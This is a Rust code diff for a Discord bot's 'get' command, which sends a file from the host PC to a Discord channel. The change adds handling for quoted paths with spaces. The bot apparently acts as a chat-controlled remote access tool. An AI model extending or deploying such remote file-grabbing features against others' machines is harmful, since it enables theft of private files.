@@ -15,19 +15,30 @@ impl BotCommand for GetCommand {
     fn name(&self) -> &str { "get" }
     fn description(&self) -> &str { "Download a file from PC and send it to Discord" }
     fn category(&self) -> &str { "filesystem" }
-    fn usage(&self) -> &str { ".get <file_path>" }
+    fn usage(&self) -> &str { ".get <file_path> or .get \"<path with spaces>\"" }
     fn examples(&self) -> &'static [&'static str] { 
-        &[".get document.pdf", ".get C:\\Users\\Desktop\\file.txt"] 
+        &[
+            ".get document.pdf", 
+            ".get C:\\Users\\Desktop\\file.txt",
+            ".get \"C:\\Users\\Desktop\\my document.pdf\"",
+            ".get 'path with spaces/file.txt'"
+        ] 
     }
     fn aliases(&self) -> &'static [&'static str] { &["getfile", "grab"] }
 
     async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
         let file_path_owned = args.rest();
-        let file_path = file_path_owned.trim();
+        let file_path_trimmed = file_path_owned.trim();
+
+        let file_path = file_path_trimmed
+            .strip_prefix('"')
+            .and_then(|s| s.strip_suffix('"'))
+            .or_else(|| file_path_trimmed.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
+            .unwrap_or(file_path_trimmed);
 
         if file_path.is_empty() {
             http.create_message(msg.channel_id)
-                .content("ERROR: Please provide a file path. Usage: `.get <file_path>`")
+                .content("ERROR: Please provide a file path. Usage: `.get <file_path>` or `.get \"<path with spaces>\"`")
                 .await?;
             return Ok(());
         }
